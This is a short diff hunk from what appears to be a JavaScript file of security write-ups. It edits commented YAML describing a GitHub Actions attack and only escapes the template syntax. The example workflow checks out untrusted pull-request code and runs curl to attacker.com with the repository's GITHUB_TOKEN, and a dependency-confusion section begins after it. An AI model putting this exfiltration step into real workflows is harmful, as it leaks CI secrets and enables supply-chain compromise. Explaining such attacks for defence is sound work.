@@ -16631,8 +16631,8 @@ const writeups = [
   #     steps:
   #       - uses: actions/checkout@v3
   #         with:
-  #           ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS
-  #       - run: curl https://attacker.com/?token=${{ secrets.GITHUB_TOKEN }}
+  #           ref: \${{ github.event.pull_request.head.sha }}  # DANGEROUS
+  #       - run: curl https://attacker.com/?token=\${{ secrets.GITHUB_TOKEN }}
   
   # ─── ATTACK 3: DEPENDENCY CONFUSION ─────────────────────────────────────────
   # Publish a public package with same name as internal private package
